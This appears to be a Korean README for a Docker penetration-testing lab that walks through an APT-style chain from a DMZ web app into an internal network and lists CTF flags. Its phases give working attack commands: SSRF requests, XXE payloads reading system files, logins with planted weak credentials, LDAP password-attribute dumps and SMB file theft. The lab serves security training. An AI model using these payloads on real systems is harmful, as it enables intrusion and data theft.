# 전체 시나리오 통합 랩 (05_full_scenario_lab)

이 랩은 실제 APT(Advanced Persistent Threat) 공격 체인을 시뮬레이션합니다.
외부에서 DMZ 웹 앱 침투 → SSRF로 내부망 탐색 → DB 침투 → 데이터 탈취까지
전체 침투 테스트 절차를 경험합니다.

---

## 네트워크 아키텍처

```
[인터넷/외부 공격자]
       |
  localhost:8888
       |
┌──────────────────────────────────┐
│  DMZ 영역 (172.30.1.0/24)        │
│                                  │
│  172.30.1.10 — dmz-web           │
│  (SSRF + XXE 취약 웹 앱)         │
│  172.30.1.100 — attacker         │
└──────────┬───────────────────────┘
           │ (DMZ ↔ 내부망 연결)
           │
┌──────────┴───────────────────────┐
│  내부 영역 (172.30.2.0/24)       │
│                                  │
│  172.30.2.20 — internal-api      │
│  (인증 없는 내부 API)             │
│                                  │
│  172.30.2.30 — db-server         │
│  (MySQL: root/root123)           │
│                                  │
│  172.30.2.40 — ldap-server       │
│  (OpenLDAP: admin/admin123)      │
│                                  │
│  172.30.2.50 — file-server       │
│  (SMB/FTP 공개 공유)              │
└──────────────────────────────────┘
```

---

## 빠른 시작

```bash
cd labs/05_full_scenario_lab
docker compose up -d

# 상태 확인
docker compose ps

# DMZ 웹 앱 접근
open http://localhost:8888

# 공격자 컨테이너 접속
docker exec -it full_lab_attacker bash
```

---

## 전체 공격 체인

### Phase 1: 정찰 (Reconnaissance)

#### 1.1 웹 앱 탐색
```bash
# 기본 페이지 확인
curl http://localhost:8888/

# 숨겨진 엔드포인트 탐색
curl http://localhost:8888/admin
curl http://localhost:8888/robots.txt
curl http://localhost:8888/sitemap.xml

# 디렉토리 브루트포스
gobuster dir -u http://localhost:8888 \
    -w /usr/share/wordlists/dirb/common.txt

# Nikto 웹 스캔
nikto -h http://localhost:8888
```

#### 1.2 네트워크 스캔 (공격자 컨테이너 내부)
```bash
# DMZ 대역 스캔
nmap -sV -T4 172.30.1.0/24

# 웹 서버 상세 스캔
nmap -A -p 80,443,8000,8080,5000 172.30.1.10
```

---

### Phase 2: 초기 침투 — SSRF 취약점 악용

#### 2.1 SSRF로 내부망 탐색
```bash
# 내부 API 서버 접근 (외부에서는 접근 불가이지만 SSRF로 가능)
curl "http://localhost:8888/preview?url=http://172.30.2.20/health"
curl "http://localhost:8888/preview?url=http://172.30.2.20/config"
curl "http://localhost:8888/preview?url=http://172.30.2.20/users"

# DB 서버 확인
curl "http://localhost:8888/preview?url=http://172.30.2.30:3306" 2>&1 | head

# 내부 대역 전체 스캔 (SSRF 활용)
for ip in $(seq 1 60); do
    result=$(curl -s "http://localhost:8888/preview?url=http://172.30.2.$ip" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "172.30.2.$ip: ALIVE"
    fi
done
```

#### 2.2 내부 API에서 크리덴셜 탈취
```bash
# DB 크리덴셜 획득
curl "http://localhost:8888/preview?url=http://172.30.2.20/config"
# 결과: {"database": {"host": "172.30.2.30", "user": "app_user", "password": "AppP4ssw0rd!"}}

# 사용자 목록 획득 (플래그 포함)
curl "http://localhost:8888/preview?url=http://172.30.2.20/users"

# 환경변수 전체 덤프
curl "http://localhost:8888/preview?url=http://172.30.2.20/env"
```

**획득 플래그**: `FLAG{1nt3rn4l_4p1_n0_4uth}`

---

### Phase 3: XXE 취약점 악용

#### 3.1 기본 XXE 파일 읽기
```bash
# /etc/passwd 읽기
curl -X POST http://localhost:8888/parse-xml \
    -d 'xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'

# /etc/hosts 읽기 (내부망 IP 확인)
curl -X POST http://localhost:8888/parse-xml \
    -d 'xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<data>&xxe;</data>'
```

#### 3.2 XXE를 활용한 SSRF (OOB)
```bash
# HTTP 요청으로 내부망 탐색
curl -X POST http://localhost:8888/parse-xml \
    -d 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://172.30.2.20/config">
  %xxe;
]>
<data>test</data>'
```

---

### Phase 4: 데이터베이스 침투

#### 4.1 MySQL 직접 접근 (내부 API를 통한 SSRF 프록시 활용)
```bash
# 내부 API의 /proxy 엔드포인트 활용
curl "http://localhost:8888/preview?url=http://172.30.2.20/proxy?url=http://172.30.2.30:3306"
```

#### 4.2 DMZ 웹 서버에서 직접 DB 접근 (웹쉘 획득 후)
```bash
# DMZ 웹 컨테이너 쉘 접속
docker exec -it full_lab_dmz_web bash

# 내부망 DB에 접근 (DMZ는 내부망과 연결됨)
mysql -h 172.30.2.30 -u app_user -p'AppP4ssw0rd!' corpdb

# 또는 root로 접속
mysql -h 172.30.2.30 -u root -p'root123' corpdb
```

#### 4.3 데이터 탈취
```sql
-- DB 내부에서 실행
USE corpdb;

-- 사용자 목록
SELECT * FROM users;

-- 민감한 크리덴셜
SELECT * FROM credentials;

-- 플래그 획득
SELECT * FROM flags;
```

**획득 플래그**: `FLAG{mysql_w34k_cr3d3nt14ls_pwn3d}`, `FLAG{y0u_c0mpl3t3d_full_ch41n}`

---

### Phase 5: LDAP 열거

```bash
# LDAP 익명 바인딩 시도 (공격자 컨테이너에서)
ldapsearch -x -H ldap://172.30.2.40:1389 \
    -b "dc=corp,dc=local" \
    "(objectClass=person)"

# Admin 바인딩으로 전체 열거
ldapsearch -x -H ldap://172.30.2.40:1389 \
    -D "cn=admin,dc=corp,dc=local" \
    -w admin123 \
    -b "dc=corp,dc=local" \
    "(objectClass=*)"

# 사용자 패스워드 속성 조회
ldapsearch -x -H ldap://172.30.2.40:1389 \
    -D "cn=admin,dc=corp,dc=local" \
    -w admin123 \
    -b "dc=corp,dc=local" \
    "(objectClass=person)" \
    userPassword
```

---

### Phase 6: 파일 서버 접근

```bash
# SMB 공개 공유 열거
smbclient -L //172.30.2.50 -N

# 공개 공유 접근 (인증 없이)
smbclient //172.30.2.50/public -N
smbclient //172.30.2.50/confidential -N
smbclient //172.30.2.50/backup -N

# 파일 다운로드
smbclient //172.30.2.50/confidential -N -c "get flag.txt /tmp/flag.txt"
smbclient //172.30.2.50/backup -N -c "get db_backup.conf /tmp/db_backup.conf"

# FTP 접근
ftp 172.30.2.50
# 또는
curl ftp://172.30.2.50/ --user anonymous:
```

**획득 플래그**: `FLAG{f1l3_s3rv3r_c0nf1d3nt14l}`

---

## 단계별 힌트

| 단계 | 힌트 |
|------|------|
| Phase 1 | `/preview` 엔드포인트는 어떤 URL도 요청을 보냅니다 |
| Phase 2 | 내부 API `/config`에는 DB 크리덴셜이 있습니다 |
| Phase 3 | XML `<!ENTITY>` 선언으로 시스템 파일을 읽을 수 있습니다 |
| Phase 4 | DMZ 웹 서버는 내부망에도 연결되어 있습니다 |
| Phase 5 | LDAP admin 계정의 패스워드는 매우 약합니다 |
| Phase 6 | SMB 공유에 인증이 필요 없는 공유가 있습니다 |

---

## 전체 공격 체인 요약

```
[외부 공격자]
     ↓
1. DMZ 웹 앱 취약점 발견 (SSRF + XXE)
     ↓
2. SSRF로 내부 API 접근
     ↓
3. 내부 API에서 DB 크리덴셜 탈취
     ↓
4. DB 접근 → 전체 사용자/크리덴셜 덤프
     ↓
5. LDAP으로 AD 사용자 열거
     ↓
6. 파일 서버 민감 데이터 탈취
     ↓
[플래그 5개 모두 획득 → 침투 테스트 완료]
```

---

## 획득 가능한 플래그 목록

| # | 플래그 | 위치 |
|---|--------|------|
| 1 | `FLAG{dmz_w3b_ssrf_xxe_pwn3d}` | DMZ 웹 /admin (X-Admin-Token 필요) |
| 2 | `FLAG{1nt3rn4l_4p1_n0_4uth}` | 내부 API /users |
| 3 | `FLAG{mysql_w34k_cr3d3nt14ls_pwn3d}` | DB flags 테이블 |
| 4 | `FLAG{y0u_c0mpl3t3d_full_ch41n}` | DB flags 테이블 (root) |
| 5 | `FLAG{f1l3_s3rv3r_c0nf1d3nt14l}` | SMB confidential 공유 |

---

## 트러블슈팅

```bash
# 서비스 상태 확인
docker compose ps

# DB 초기화 실패 시
docker compose restart db-server
docker compose logs db-server

# 내부 API 빌드 실패 시 (ldap3 패키지 문제)
docker compose build internal-api --no-cache

# DMZ ↔ 내부 네트워크 연결 확인
docker exec full_lab_dmz_web ping -c 3 172.30.2.20
```
